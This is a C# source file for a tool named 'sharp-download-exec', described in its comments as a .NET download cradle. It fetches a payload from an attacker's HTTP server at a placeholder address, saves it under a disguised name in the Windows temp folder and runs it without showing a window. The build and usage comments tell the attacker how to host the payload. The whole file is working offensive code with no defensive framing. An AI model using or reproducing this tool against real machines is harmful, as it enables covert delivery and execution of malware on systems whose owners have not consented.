using System;
using System.Diagnostics;
using System.IO;
using System.Net;

/*
 * sharp-download-exec - .NET Download Cradle
 *
 * Downloads a file from the attacker's HTTP server and executes it.
 *
 * Build:  dotnet build -o build/ -c Release
 * Usage:  sharp-download-exec.exe http://10.10.10.10/payload.exe
 *
 * Attacker:
 *   python3 -m http.server 80
 */

namespace SharpDownloadExec
{
    class Program
    {
        // -- CONFIGURE THESE (or pass as args) ------------
        static string DefaultUrl = "http://10.10.10.10/payload.exe";
        static string DropPath = @"C:\Windows\Temp\update.exe";
        // -------------------------------------------------

        static void Main(string[] args)
        {
            string url = args.Length > 0 ? args[0] : DefaultUrl;
            string path = args.Length > 1 ? args[1] : DropPath;

            Console.WriteLine($"[*] Downloading: {url}");

            using (WebClient wc = new WebClient())
            {
                wc.DownloadFile(url, path);
            }

            Console.WriteLine($"[+] Saved to: {path}");
            Console.WriteLine("[*] Executing...");

            Process.Start(new ProcessStartInfo
            {
                FileName = path,
                UseShellExecute = false,
                CreateNoWindow = true
            });
        }
    }
}
